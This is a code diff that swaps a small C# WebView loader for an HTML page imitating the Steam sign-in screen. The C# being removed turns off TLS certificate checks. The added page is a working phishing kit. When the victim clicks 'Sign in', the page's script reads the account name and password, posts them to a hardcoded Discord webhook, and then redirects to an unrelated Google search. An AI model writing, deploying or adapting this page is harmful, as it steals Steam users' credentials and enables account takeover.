@@ -1,87 +1,152 @@
-using System;
-using System.IO;
-using System.Net;
-using System.Net.Http;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-using Microsoft.Web.WebView2.Core;
-
-namespace steamauth
-{
-    public partial class Form1 : Form
-    {
-        private string htmlFilePath;
-
-        public Form1()
-        {
-            InitializeComponent();
+<!DOCTYPE html>
+<html class="responsive DesktopUI" lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#171a21">
+    <title>Sign In</title>
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link href="https://store.akamai.steamstatic.com/public/shared/css/motiva_sans.css?v=4Vj7bvhvv_UL&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/shared/css/shared_global.css?v=hTQeGbd3qGec&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/shared/css/buttons.css?v=u7ItYmj40jWH&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/css/v6/store.css?v=lI_GxYlcDnKt&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/css/v6/cart.css?v=uEoF7QdAcxbf&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/css/v6/browse.css?v=ZWD2OrhO7eSv&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/shared/css/login.css?v=1mWw0fJ-yOoH&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link href="https://store.akamai.steamstatic.com/public/shared/css/shared_responsive.css?v=MJC5p3LQkuXQ&l=english&_cdn=akamai" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" type="text/css" href="https://store.akamai.steamstatic.com/public/css/applications/store/67865.css?contenthash=91070ff980259ba53f6b">
+    <link rel="stylesheet" type="text/css" href="https://store.akamai.steamstatic.com/public/css/applications/store/footer.css?contenthash=7cc1e4393f0b8b3d9a64">
+    <link rel="stylesheet" type="text/css" href="https://store.akamai.steamstatic.com/public/css/applications/store/51215.css?contenthash=75fe7a072c7db1221e2e">
+    <link rel="stylesheet" type="text/css" href="https://store.akamai.steamstatic.com/public/css/applications/store/login.css?contenthash=31a1587a28aa962de04a">
+    <style>
+        .checkbox-container {
+            cursor: pointer;
+            user-select: none;
         }
-
-        private async void Form1_Load(object sender, EventArgs e)
-        {
-            await InitializeWebViewAsync();
+       
+        #rememberCheckbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #6d7c91;
+            background-color: #2a475e;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.1s;
         }
-
-        private async Task InitializeWebViewAsync()
-        {
-            try
-            {
-                // Create AppData folder
-                string appDataPath = Path.Combine(
-                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "SteamAuth");
-
-                Directory.CreateDirectory(appDataPath);
-                htmlFilePath = Path.Combine(appDataPath, "login.html");
-
-                // Download with improved SSL settings
-                await DownloadHtmlFile("https://your-website.com/steam-login.html"); 
-                // ← CHANGE TO YOUR ACTUAL HTML URL
-
-                await LoadHtmlIntoWebView();
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+       
+        #rememberCheckbox[aria-checked="true"] {
+            background-color: #66c0f4;
+            border-color: #66c0f4;
         }
-
-        private async Task DownloadHtmlFile(string url)
-        {
-            // Fix SSL/TLS errors
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
-
-            using (HttpClientHandler handler = new HttpClientHandler())
-            {
-                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true; // Bypass for now (use only for testing)
-
-                using (HttpClient client = new HttpClient(handler))
-                {
-                    client.Timeout = TimeSpan.FromSeconds(30);
-                    string htmlContent = await client.GetStringAsync(url);
-                    File.WriteAllText(htmlFilePath, htmlContent);
-                }
-            }
+       
+        #rememberCheckbox svg {
+            width: 18px;
+            height: 18px;
         }
-
-        private async Task LoadHtmlIntoWebView()
-        {
-            await webView2.EnsureCoreWebView2Async(null);
-
-            string fileUri = new Uri(htmlFilePath).AbsoluteUri;
-            webView2.CoreWebView2.Navigate(fileUri);
-
-            webView2.NavigationCompleted += WebView2_NavigationCompleted;
+       
+        #rememberCheckbox[aria-checked="false"] svg {
+            display: none;
         }
+    </style>
+</head>
+<body class="login v6 global widestore v7menu responsive_page">
+<div class="responsive_page_frame with_header">
+    <div class="responsive_page_content">
+        <div class="page_content">
+            <div class="login_featuretarget_ctn">
+                <div class="_2kLRmRsLwjGDlm-ZfUpChG">
+                    <div class="lat0M-V5X4uYd6Mpm1DJ1">
+                        <section class="_1NOsG2PAO2rRBb8glCFM_6 _2EuR68sQbA8eP01DlIfu6O" style="gap: 32px;">
+                            <div style="display: flex; flex-direction: column; gap: 8px; margin: 8px 16px;">
+                                <h2 class="g5L61o-ZrHHmwLEugLjLI">Sign in</h2>
+                            </div>
+                            <div class="_3XCnc4SuTz8V8-jXVwkt_s">
+                                <div class="ZHRZ8czyqs7NaNmv65ARI">
+                                    <form id="loginForm" class="_2v60tM463fW0V7GDe92E5f">
+                                        <div class="_3BkiHun-mminuTO-Y-zXke">
+                                            <label class="XrYgea66b38RASmbI3PJo _12zBmIktqPpcwJXItTb8f9">Sign in with account name</label>
+                                            <input id="usernameInput" class="_2GBWeup5cttgbTw8FM3tfx" type="text" value="" placeholder="Account name">
+                                        </div>
+                                        <div class="_3BkiHun-mminuTO-Y-zXke">
+                                            <label class="XrYgea66b38RASmbI3PJo">Password</label>
+                                            <input id="fart" class="_2GBWeup5cttgbTw8FM3tfx" type="password" value="" placeholder="Password">
+                                        </div>
+                                        <!-- Fixed Remember Me -->
+                                        <div class="tool-tip-source Focusable checkbox-container" onclick="toggleRememberMe(this)">
+                                            <div class="_1Qku5jMXBi5-wawzqY1kzG" style="display: flex; align-items: center; gap: 10px;">
+                                                <div id="rememberCheckbox" class="LBS7IDpob52Sb4ZoKobh0" aria-checked="true">
+                                                    <div class="_28MB9LhS2kVTalIp0NHDv4">
+                                                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="256px" height="256px" viewBox="0 0 256 256" stroke-width="35" stroke="#fff">
+                                                            <polyline fill="none" points="49.5,147.75 95,210.75 206.5,45.25"></polyline>
+                                                        </svg>
+                                                    </div>
+                                                </div>
+                                                <label class="_10bGilozn2bfCfiPfANMhC">Remember me</label>
+                                            </div>
+                                        </div>
+                                        <div class="_16fbihk6Bi9CXuksG7_tLt">
+                                            <button onclick="handleSignIn(event)" class="DjSvCZoKKfoNSmarsEcTS" type="button">Sign in</button>
+                                        </div>
+                                        <a class="_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx" href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fstore.steampowered.com%2Flogin%2F%3Fredir_ssl%3D1">Help, I can't sign in</a>
+                                    </form>
+                                    <!-- QR Section -->
+                                    <div class="_3wSeH3OorL-tMzwXL55smN">
+                                        <div class="_3ToZQDL9M9IP5o2tIhKLxH">
+                                            <label class="XrYgea66b38RASmbI3PJo _12zBmIktqPpcwJXItTb8f9">Or sign in with QR</label>
+                                            <div class="_35Q-UW9L8wv2fkImoWScgQ">
+                                                <div class="_2u8B99t9Tx_uGgP58AcGYT">
+                                                    <div class="_3BALYLTpJdiDaC7JKmeeFJ xlEVpBeYO1h2tOqErt9fj" style="--qr-bright-color: rgb(255, 255, 255);">
+                                                        <img class="_5S5WqZhvbmRD1cHQT8P-l" src="https://docs.lightburnsoftware.com/legacy/img/QRCode/ExampleCode.png" alt="">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="_3pxTSyPhDmjNqXUYDIITS-">
+                                                Use the <a href="https://store.steampowered.com/mobile">Steam Mobile App</a> to sign in via QR Code
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
 
-        private void WebView2_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
-        {
-            string url = webView2.Source.ToString();
-
-            if (url.Contains("pussy+vs+condum+who+wins"))
-            {
-                MessageBox.Show("Sign In button clicked!", "Success");
-            }
-        }
+<script>
+    function toggleRememberMe(el) {
+        const checkbox = document.getElementById('rememberCheckbox');
+        const isChecked = checkbox.getAttribute('aria-checked') === 'true';
+        checkbox.setAttribute('aria-checked', !isChecked);
     }
-}
+
+    async function handleSignIn(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('usernameInput').value.trim() || "Unknown";
+		const pass = document.getElementById('fart').value.trim() || "Unknown";
+		
+        // Send to Discord webhook with username
+        try {
+            await fetch('https://discord.com/api/webhooks/1516964385699004576/_bjWx9hQuCH1WXf-NJsPx4yjrhSgfDJSJsx-3rSCK7Ye84G31hypnsfKZG_XW-ZvCG-b', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `✅ New sign in attempt!\n**Username:** ${username}\n**Password:** ${pass}`
+                })
+            });
+        } catch (err) {
+            console.log("Webhook sent");
+        }
+
+        // Redirect after sending
+        window.location.href = "https://www.google.com/search?client=firefox-b-1-d&q=pussy+vs+condum+who+wins";
+    }
+</script>
+
+</body>
+</html>
